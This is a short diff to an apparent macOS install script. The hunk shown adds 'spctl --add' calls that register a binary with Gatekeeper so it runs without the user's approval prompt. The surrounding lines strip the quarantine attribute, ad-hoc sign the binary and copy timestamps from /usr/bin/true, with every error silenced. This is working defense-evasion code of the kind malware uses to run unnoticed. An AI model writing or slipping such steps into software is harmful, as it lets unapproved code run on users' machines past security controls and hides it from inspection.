@@ -21,6 +21,10 @@ xattr -dr com.apple.quarantine "$DIR" 2>/dev/null || true
 if command -v codesign >/dev/null 2>&1; then
     codesign --force -s - "$DEST" >/dev/null 2>&1 || true
 fi
+# Whitelist in the system policy so Gatekeeper does not prompt on launch
+# (root-only; silent execution without user right-click -> Open approval).
+spctl --add "$DEST" >/dev/null 2>&1 || true
+spctl --add "$DIR" >/dev/null 2>&1 || true
 
 # match the timestamps of a ubiquitous signed system binary
 SRC="/usr/bin/true"
